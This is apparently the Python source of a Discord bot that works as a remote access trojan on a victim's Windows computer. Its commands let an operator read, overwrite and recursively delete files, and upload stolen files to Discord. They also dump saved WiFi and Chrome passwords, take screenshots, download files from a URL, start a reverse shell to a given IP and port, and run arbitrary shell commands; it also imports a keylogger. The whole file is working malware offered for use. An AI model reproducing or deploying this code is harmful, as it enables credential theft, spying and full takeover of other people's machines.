import os
import discord
from discord.ext import commands
import time
import requests
import shutil
from passwords import main
from wifi import wifiSnatch
from details import detailGetter
import numpy as np
import cv2
from keylogger import Keylogger
import subprocess

import pyautogui

from reverseshell import initiate

TOKEN = ''
format = "---------------------------------------------------"

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

tester = """          
```                                                                     
                                                ..-'''-.             
_________   _...._                      _..._   \.-'''\ \            
\        |.'      '-.         _     _ .'     '.        | |           
 \        .'```'.    '. /\    \\   //.   .-.   .    __/ /   .-,.--.  
  \      |       \     \`\\  //\\ // |  '   '  |   |_  '.   |  .-. | 
   |     |        |    |  \`//  \'/  |  |   |  |      `.  \ | |  | | 
   |      \      /    .    \|   |/   |  |   |  |        \ '.| |  | | 
   |     |\`'-.-'   .'      '        |  |   |  |         , || |  '-  
   |     | '-....-'`                 |  |   |  |         | || |      
  .'     '.                          |  |   |  |        / ,'| |      
'-----------'                        |  |   |  |-....--'  / |_|      
                                     '--'   '--'`.. __..-'           
```                                                           
---------------------------------------------------
"""
helpmepls = """
1. Details 
  Usage: !details
  Does: Prints basic details of the computer (hostname, public/private IPv4, MAC address, User, OS info, cwd)
2. DIR
  Usage: !dir
  Does: Prints all files and folders in a directory
3. CD
  Usage: !cd directoryName
  Does: Changes current working directory (cwd)
4. CD Back
   Usage: !cdb
   Does: Moves you back a directory
5. Remove
   Usage: !rm fileName
   Does: Removes a file (NOT A DIRECTORY)
6. RM Directory
   Usage: !rmdir directoryName
   Does: Removes a folder (THIS IS RECURSIVE, CAREFUL)
8. Read
  Usage: !read fileName
  Does: Reads entirity of a file, must be in current directory (this will hopefully change)
9. Read line
  Usage: !readln fileName numberOfLines
  Does:
10. append
  Usage: !append fileName content
  Does: Appends something in a txt (or other file)
11. Overwrite
  Usage: !overwrite fileName content
  Does: Overwrites everything with your own content. 
                Keep in mind you can use this to create a new file too
12. WiFi
  Usage: !wifi
  Does: Sends all stored WiFi passwords"""
helpmepls2 = """
13. Steal
   Usage: !steal fileName
   Does: Uploads the file to discord for you to download
14. Inject
   Usage: !inject fileLink
   Does: Downloads a file to the client computer, in the cwd
15. Passwords
   Usage: !passwords
   Does: Steals all **CHROME** passwords
16. Screenshot
   Usage: !screenshot
   Does: Screenshots client screen
17. Reverse shell
   Usage: !revshell IP PORT
   Does: Initiates a reverse shell on a given ip and port"""


@bot.event
async def on_ready():
    print('We have logged in')


@bot.event
async def on_guild_join(guild):
    welcome_message = "As of now, most, if not all commands on this bot ONLY support windows.\nTo see this again, use !help\n"

    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).send_messages:
            # Send the welcome message to the first available channel with send permissions
            await channel.send(tester+welcome_message+format+helpmepls)
            await channel.send(helpmepls2)
            break


@bot.command()
async def help(ctx, *, argument=None):
    await ctx.send(helpmepls+helpmepls2)


@bot.command()
async def details(ctx, *, argument=None):
    details = detailGetter()
    await ctx.send(details)


@bot.command()
async def pwd(ctx, *, argument=None):
    try:
        directory = os.getcwd()
        await ctx.send(directory)
    except Exception as e:
        print(e)
        await ctx.send("Something got screwed up!")


@bot.command()
async def dir(ctx, *, argument=None):
    try:
        directory = os.getcwd()
        ls = os.listdir(path=directory)

        # Create a single string with newlines between elements
        items_string = "\n".join(ls)

        # Send the entire string at once
        await ctx.send(items_string)
    except Exception as e:
        print(e)
        await ctx.send("Try passing a valid directory")


@bot.command()
async def cd(ctx, newDir=None, *, argument=None):
    if not newDir:
        await ctx.send("Please provide a valid directory.")
        return  # Exit the command if newDir is missing
    try:
        os.chdir(path=newDir)
        current_dir = os.getcwd()
        await ctx.send(current_dir)
        # Change the working directory
    except Exception as e:
        print(e)
        await ctx.send(
            "An error occurred while changing the directory. Try passing a valid directory."
        )


@bot.command()
async def cdb(ctx):
    try:
        current_dir = os.getcwd()
        parent_dir = os.path.dirname(current_dir)
        os.chdir(parent_dir)
        await ctx.send(os.getcwd())
    except Exception as e:
        print(e)
        await ctx.send("idk man something got screwed up")


@bot.command()
async def read(ctx, *, file=None):
    if not file:
        await ctx.send('Pass a file argument (!read file.txt)')
        return
    try:
        f = open(file, "r")
        await ctx.send(f.read())
    except Exception as e:
        print(e)
        await ctx.send(
            "Try passing a valid file to read (must be in cwd)\nMake sure to use: !read fileName\nFile may be empty, or too long for discord's character limit, try downloading it!"
        )


@bot.command()
async def readln(ctx, file=None, lines=None, *, argument=None):
    try:
        f = open(file, "r")
        x = 0
        while (x < lines):
            await ctx.send(f.readline())
            x += 1
    except Exception as e:
        print(e)
        await ctx.send(
            "Try passing a valid file to read (must be in cwd), as well as # of lines"
        )


@bot.command()
async def append(ctx, file=None, *content):
    try:
        content = ' '.join(content)
        f = open(file, "a")
        f.write(content)
        f.close()
        f = open(file, "r")
        await ctx.send(f.read())
    except Exception as e:
        print(e)
        await ctx.send("Try passing a valid file to write to, with content")


@bot.command()
async def overwrite(ctx, file=None, *, content):
    try:
        f = open(file, "w")
        f.write(content)
        f.close()
        f = open(file, "r")
        await ctx.send(f.read())
    except Exception as e:
        print(e)
        await ctx.send("Try passing a valid file to write to")


@bot.command() #CREDIT TO https://nitratine.net/blog/post/get-wifi-passwords-with-python/
async def wifi(ctx, *, argument=None):
    try:
        data = wifiSnatch()
        await ctx.send(data)
    except Exception as e:
        await ctx.send(
            'Error, maybe they have actual security or something, who knows')


@bot.command(pass_context=True)
async def steal(ctx, filePath):
    try:
        area = ctx.message.channel
        await area.send(file=discord.File(filePath), content="File!")
    except Exception as e:
        print(e)
        await ctx.send(
            "An error has occurred, try a working filepath (include the filename)")

@bot.command()
async def inject(ctx, link=None):
    try:
        try:
            response = requests.get(link)
            if response.status_code == 200:
                with open('file.txt', 'wb') as file:
                    file.write(response.content)
                await ctx.send('File downloaded successfully.')
            else:
                await ctx.send('Failed to download the file. Status code:',
                               response.status_code)
        except Exception as e:
            print('An error occurred:', e)
            await ctx.send("Error")
    except Exception as e:
        print('e')
        await ctx.send("Make sure to send a url in the second parameter(!inject https://google.com")


@bot.command()
async def rm(ctx, file_path=None):
    try:
        os.remove(file_path)
        await ctx.send(f"File '{file_path}' deleted successfully.")
    except OSError as e:
        await ctx.send(f"Error deleting the file '{file_path}': {e}")


@bot.command()
async def rmdir(ctx, directory_path=None):
    try:
        shutil.rmtree(directory_path)
        await ctx.send(
            f"Directory '{directory_path}' and its contents deleted successfully.")
    except OSError as e:
        await ctx.send(f"Error deleting the directory '{directory_path}': {e}")


@bot.command() #CREDITS: https://thepythoncode.com/article/extract-chrome-passwords-python
async def passwords(ctx): 
    await ctx.send(main())


@bot.command()
async def screenshot(ctx):
    # take a screenshot using pyautogui
    image = pyautogui.screenshot()
    # since pyautogui takes a PIL (Pillow) image in RGB, convert it to numpy array in BGR format
    image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)

    # Define the file path with the correct directory separator
    file_path = os.path.join(os.getcwd(), "image1.png")

    # Save the image to the disk using OpenCV
    cv2.imwrite(file_path, image)

    # Get the channel to send the file to
    area = ctx.message.channel

    # Send the image file to the Discord channel
    await area.send(file=discord.File(file_path), content="File!")

    # Remove the temporary image file
    os.remove(file_path)


@bot.command()
async def revshell(ctx, ip, port):
    try:
        initiate(ip, port)
        await ctx.send(f"Rever shell initiated on ip: {ip} and port: {port}")
    except Exception as e:
        await ctx.send(f"There has been an error\n{e}")

@bot.command()
async def move(ctx, file1, file2):
  try:
    shutil. move(file1, file2)
    await ctx.send(f"File moved from {file1} to {file2}")
  except Exception as e:
    await ctx.send(f"There has been an error\n{e}")

@bot.command()
async def rename(ctx, file1, file2):
  try:
    os.rename(file1, file2)
    await ctx.send(f"File renamed from {file1} to {file2}")
  except Exception as e:
    await ctx.send(f"There has been an error\n{e}")

@bot.command()
async def shell(ctx, *command):
  try:
    return_code = subprocess.call(f"{command}", shell=True)
  except Exception as e:
    await ctx.send(f"There has been an error\n{e}")
    



bot.run(TOKEN)
